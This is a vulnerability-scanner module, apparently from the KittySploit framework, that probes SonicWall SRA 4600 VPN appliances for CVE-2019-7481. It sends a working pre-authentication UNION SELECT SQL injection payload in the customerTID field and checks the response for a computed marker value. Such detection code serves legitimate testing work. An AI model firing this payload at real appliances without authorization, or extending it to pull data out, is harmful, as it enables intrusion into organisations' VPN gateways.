#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The SonicWall SRA 4600 VPN appliance is susceptible to a pre-authentication SQL injection vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SonicWall SRA 4600 VPN - SQL Injection Detection',
        'description': 'The SonicWall SRA 4600 VPN appliance is susceptible to a pre-authentication SQL injection vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'sonicwall', 'sqli', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.crowdstrike.com/blog/how-ecrime-groups-leverage-sonicwall-vulnerability-cve-2019-7481/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-7481',
            'https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2019-0016',
            'https://github.com/Ostorlab/KEV',
            'https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors',
        ],
        'cve': 'CVE-2019-7481',
    }

    def run(self):
        path = '/cgi-bin/supportInstaller'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept-Encoding': 'identity', 'User-Agent': 'MSIE', 'Content-Type': 'application/x-www-form-urlencoded'}, data="fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,11132*379123,0,0,0,0--\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('4220397236',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='SonicWall SRA 4600 VPN - SQL Injection detected', path=path)
            return True
        return False

